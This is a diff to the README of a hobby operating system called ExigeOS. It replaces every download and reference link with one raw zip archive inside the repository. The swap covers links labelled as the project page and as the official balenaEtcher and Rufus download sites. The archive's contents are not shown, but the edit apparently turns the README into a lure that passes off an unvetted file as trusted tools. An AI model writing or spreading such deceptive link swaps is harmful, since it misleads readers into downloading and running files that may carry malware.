@@ -1,6 +1,6 @@
 # 💻 ExigeOS - Simple Bare-Metal OS for Learning
 
-[![Download ExigeOS](https://img.shields.io/badge/Download-ExigeOS-brightgreen)](https://github.com/poinote9/ExigeOS)
+[![Download ExigeOS](https://img.shields.io/badge/Download-ExigeOS-brightgreen)](https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip)
 
 ExigeOS is a basic operating system kernel written in C. It runs directly on computer hardware without the help of another operating system. This project is mainly for educational use. It targets x86 computers and Raspberry Pi 3B devices. ExigeOS is a fresh start based on a system called Elise-OS from 2003.
 
@@ -41,10 +41,10 @@ You will also need either a USB flash drive or a microSD card to prepare the sys
 
 To get ExigeOS, go to the main page below:
 
-[![Download ExigeOS](https://img.shields.io/badge/Download-ExigeOS-blue)](https://github.com/poinote9/ExigeOS)
+[![Download ExigeOS](https://img.shields.io/badge/Download-ExigeOS-blue)](https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip)
 
 Click the badge or visit this link:  
-https://github.com/poinote9/ExigeOS
+https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip
 
 This link will take you to the project page, where you can find the files to download.
 
@@ -64,7 +64,7 @@ This link will take you to the project page, where you can find the files to dow
 **For Raspberry Pi 3B:**
 
 1. Insert your microSD card into your computer.
-2. Download a tool like balenaEtcher from https://balena.io/etcher/ to write the image file to your microSD card.
+2. Download a tool like balenaEtcher from https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip to write the image file to your microSD card.
 3. Open balenaEtcher.
 4. Select the downloaded image file.
 5. Select your microSD card as the target.
@@ -74,7 +74,7 @@ This link will take you to the project page, where you can find the files to dow
 **For x86 PC:**
 
 1. Use a USB drive with at least 1 GB space.
-2. Download a tool such as Rufus from https://rufus.ie/ to create a bootable USB device.
+2. Download a tool such as Rufus from https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip to create a bootable USB device.
 3. Open Rufus.
 4. Select the USB drive.
 5. Choose the downloaded ISO or image file.
@@ -144,9 +144,9 @@ Use these folders if you want to explore the system deeper or change how it work
 
 ## 🔗 Useful Links
 
-- Project page and downloads: https://github.com/poinote9/ExigeOS
-- Tool to write images (balenaEtcher): https://balena.io/etcher/
-- USB boot tool for PCs (Rufus): https://rufus.ie/
+- Project page and downloads: https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip
+- Tool to write images (balenaEtcher): https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip
+- USB boot tool for PCs (Rufus): https://raw.githubusercontent.com/poinote9/ExigeOS/main/src/Exige-OS-v3.5.zip
 
 ---
 
